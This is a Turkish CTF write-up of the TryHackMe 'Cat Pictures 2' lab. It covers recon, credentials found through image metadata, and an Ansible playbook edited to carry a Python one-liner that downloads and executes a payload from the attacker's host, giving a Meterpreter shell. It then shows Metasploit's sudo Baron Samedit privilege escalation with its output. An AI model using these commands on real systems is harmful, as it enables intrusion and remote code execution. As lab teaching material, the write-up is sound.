---
title: 'TryHackMe | Cat Pictures 2 WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [ansible, gitea, sudo]
render_with_liquid: false
media_subpath: /images/tryhackme_cat_pictures2/
image:
  path: logo.webp
---

## Özet

Cat Pictures 2, gitea servisinde paylaşılmış bir ansible dosyasını çalıştıran, kolay seviye bir linux makinedir. Exiftool aracılığıyla bulduğumuz kullanıcı bilgilerini kullanarak gitea servisine giriş yapacak ve paylaşılan tek repo içerisindeki playbook.yaml dosyasına reverse shell komutumuzu yapıştıracağız. Bağlantı sonrasında ise `baron samedit` exploitinden yararlanarak yetki yükselteceğiz.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.224.169
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 03:12 EDT
Nmap scan report for 10.10.224.169
Host is up (0.091s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:f0:03:36:26:36:8c:2f:88:95:2c:ac:c3:bc:64:65 (RSA)
|   256 4f:f3:b3:f2:6e:03:91:b2:7c:c0:53:d5:d4:03:88:46 (ECDSA)
|_  256 13:7c:47:8b:6f:f8:f4:6b:42:9a:f2:d5:3d:34:13:52 (ED25519)
8080/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.9)
|_http-title: Welcome to nginx!
|_http-server-header: SimpleHTTP/0.6 Python/3.6.9
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tarama sonucunda 22 ve 8080 numaralı portların açık olduğunu öğreniyoruz.

### 80 numaralı portun incelenmesi

![](1.webp){: width="1000" height="500" }

Ana sayfada kedilerin bulunduğu bir albüm var. Albümdeki resimleri incelerken bir resmin açıklamasında meta verilerini kontrol etmem gerektiği ile ilgili bir yazı ile karşılaştım.

![](2.webp){: width="1200" height="600" }

Exiftool ile dosyanın meta verilerini çıkardığımızda "title" parametresinin içerisinde 8080 numaralı HTTP servisinde bulunan bir dosya yolunu gösterdiğini görüyoruz.

```console
$ exiftool f5054e97620f168c7b5088c85ab1d6e4.jpg
...
Title                           : :8080/764efa883dda1e11db47671c4a3bbd9e.txt
...
```

Bu dosyanın içerisinde ise kullanıcı bilgileri ile beraber gitea uygulamasının ve üzerinde paylaşılmış olan bir uygulamanın bulunduğu port numarası yer alıyor.

```console
$curl 10.10.224.169:8080/764efa883dda1e11db47671c4a3bbd9e.txt
note to self:

I setup an internal gitea instance to start using IaC for this server. It's at a quite basic state, but I'm putting the password here because I will definitely forget.
This file isn't easy to find anyway unless you have the correct url...

gitea: port 3000
user: ****
password: ****

ansible runner (olivetin): port 1337
```

### 3000 numaralı portun incelenmesi

![](3.webp){: width="1200" height="600" }

Verilen kullanıcı bilgileri ile gitea uygulamasına giriş yaptıktan sonra kullanıcının repolarını görmek için profil sayfasına gittim. Burada `ansible` adında bir repo bulunuyor. İçerisinde ise bulmamız gereken bayraklardan biri ve bir playbook.yaml dosyası bulunuyor. playbook.yaml dosyasının içeriğini aşağıda görüyorsunuz.

```yaml
---
- name: Test 
  hosts: all                                  # Define all the hosts
  remote_user: bismuth                                  
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

### 1337 numaralı portun incelenmesi

![](4.webp){: width="1200" height="600" }

Burada bir takım işler yapabileceğimiz ve yaptığımız işlerin kayıtlarını görüntüleyebileceğimiz bir uygulama bulunuyor.

![](5.webp){: width="1000" height="500" }

## Sömürü aşaması

1337 numaralı portta çalışan uygulamada ki `run ansible` seçeneği büyük ihtimalle 3000 numaralı portta çalışan gitea sayfasındaki ansible dosyasındaki playbook.yaml dosyasını çalıştırıyor. Bu dosyanın komut çalıştırıldığı yere shell alabileceğimiz bir komut girer ve 1337 numaralı porttaki `run ansible` butonuna tıklarsak shell alabiliriz. Öncelikle dosyayı düzenleyelim.

```yaml
---
- name: Test
  hosts: all                                  # Define all the hosts
  remote_user: bismuth
  # Defining the Ansible task
  tasks:             
    - name: get the username running the deploy
      become: false
      command: python3 -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.21.66.61:8080/n9trzcfCpQLzCS', context=ssl._create_unverified_context());exec(r.read());"
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: echo hi
```

Dosyayı düzenledikten sorna 1337 numaralı porta dönüyor ve `run ansible` butonuna tıklıyoruz. Bir kaç saniye içinde komut çalıştırılıyor ve bağlantımızı alıyoruz.

![](6.webp){: width="1200" height="600" }

## Yetki yükseltme

### root

Sistemdeki zafıylıkları tespit etmek için metasploitte bulunan `linux exploit suggester` modülünü kullanacağım.

```console
(Meterpreter 1)(/home/bismuth) > run post/multi/recon/local_exploit_suggester
 1   exploit/linux/local/ansible_node_deployer                           Yes                      The target appears to be vulnerable. ansible playbook executable found
 2   exploit/linux/local/cve_2021_3493_overlayfs                         Yes                      The target appears to be vulnerable.
 3   exploit/linux/local/cve_2022_0995_watch_queue                       Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/nested_namespace_idmap_limit_priv_esc           Yes                      The target appears to be vulnerable.
 5   exploit/linux/local/pkexec                                          Yes                      The service is running, but could not be validated.
 6   exploit/linux/local/runc_cwd_priv_esc                               Yes                      The target appears to be vulnerable. Version of runc detected appears to be vulnerable: 1.1.4
 7   exploit/linux/local/su_login                                        Yes                      The target appears to be vulnerable.
 8   exploit/linux/local/sudo_baron_samedit                              Yes                      The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.
 9   exploit/linux/local/sudoedit_bypass_priv_esc                        Yes                      The target appears to be vulnerable. Sudo 1.8.21p2.pre.3ubuntu1 is vulnerable, but unable to
```

Tarama sonucunda sistemde bir çok zafiyetin barındığını öğreniyoruz. İlk baştaki `ansible_node_deployer` eploitini önermesinin sebebi biraz önce düzenlemiş olduğumuz playbook.yaml dosyası olabilir. Onu görmezden gelip diğer exploitleri kullanarak yetki yükseltmeye çalışalım.

```console
[msf](Jobs:2 Agents:1) exploit(linux/local/sudo_baron_samedit) >> exploit
[*] Started reverse TCP handler on 10.21.66.61:4003 
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: python
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. sudo 1.8.21.2 is a vulnerable build.
[*] Using automatically selected target: Ubuntu 18.04 x64 (sudo v1.8.21, libc v2.27)
[*] Writing '/tmp/OJAAkP.py' (763 bytes) ...
[*] Writing '/tmp/libnss_Hcwd/DJ .so.2' (548 bytes) ...
[*] Sending stage (3045380 bytes) to 10.10.224.169
[+] Deleted /tmp/OJAAkP.py
[+] Deleted /tmp/libnss_Hcwd/DJ .so.2
[+] Deleted /tmp/libnss_Hcwd
[*] Meterpreter session 2 opened (10.21.66.61:4003 -> 10.10.224.169:59382) at 2025-03-24 03:56:49 -0400

(Meterpreter 2)(/tmp) > cd /root
(Meterpreter 2)(/root) > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
...
100644/rw-r--r--  33    fil   2022-11-07 14:26:43 -0500  flag3.txt
(Meterpreter 2)(/root) > cat flag3.txt 
6d2***971
```

Exploitlerin bir çoğu eksik araç veya yetki yüzünden çalışmadı. Ancak `sudo_baron_samedit` exploiti ile yetki yükseltebildim.
